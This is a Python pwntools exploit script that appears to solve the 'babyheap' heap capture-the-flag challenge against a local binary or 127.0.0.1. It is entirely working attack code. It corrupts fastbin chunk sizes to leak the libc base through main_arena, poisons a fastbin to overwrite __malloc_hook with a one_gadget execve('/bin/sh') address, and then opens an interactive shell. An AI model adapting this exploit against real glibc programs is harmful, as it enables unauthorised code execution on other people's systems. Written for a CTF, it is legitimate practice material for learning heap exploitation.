#!/usr/bin/env python

from pwn import *
import sys

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'

context.binary = "./babyheap"
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./babyheap")
log.info('PID: ' + str(proc.pidof(p)[0]))

ENV = {"LD_PRELOAD":"/lib/x86_64-linux-gnu/libc.so.6"}
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
babyheap = ELF('./babyheap')


def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def fill(idx, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)

def free(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def dump(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvline()
    return p.recvline()

def leak():
    alloc(0x20)
    alloc(0x20)
    alloc(0x20)
    alloc(0x20)
    alloc(0x80)

    free(1)
    free(2)
    payload = p64(0)*5
    payload += p64(0x31)
    payload += p64(0)*5
    payload += p64(0x31)
    payload += p8(0xc0)
    fill(0, payload)

    payload = p64(0)*5
    payload += p64(0x31)
    fill(3, payload)

    alloc(0x20)
    alloc(0x20)

    payload = p64(0)*5
    payload += p64(0x91)
    fill(3, payload)
    alloc(0x80)
    free(4)

    libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78#0x7ffff7dd1b20(&main_arena)-0x00007ffff7a0d000(&libc_base) = 0x3c4b78
    return libc_base
def fastbin_attack(libc_base):
    malloc_hook = libc.symbols['__malloc_hook'] + libc_base
    system_addr = libc.symbols['system'] + libc_base

    log.info("malloc_hook: " + hex(malloc_hook))
    log.info("system_addr: " + hex(system_addr))
#    exit(0)
    alloc(0x60)
    free(4)

    payload = p64(malloc_hook-0x23)
    #payload = p64(libc_base+0x3c4aed)
    #log.info("_malloc_hook:"+hex(libc_base+0x3c4aed+0x23))
    '''
    0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
    0x7ffff7dd1afd:	0xfff7a92e20000000	0xfff7a92a0000007f
    0x7ffff7dd1b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000

    '''
    #gdb.attach(p)

    fill(2, payload)

    alloc(0x60)
    alloc(0x60)

    payload = p8(0)*3
    payload += p64(0)*2
    #one_gadget /lib/x86_64-linux-gnu/libc.so.6
    #0x45216	execve("/bin/sh", rsp+0x30, environ)

    payload += p64(libc_base+0x45216)
    fill(6, payload)

    alloc(255)
def main():
    #gdb.attach(p)
    libc_base = leak()
    log.info("libc_base: " + hex(libc_base))
    fastbin_attack(libc_base)
    p.interactive()
    
if __name__ == "__main__":
    main()
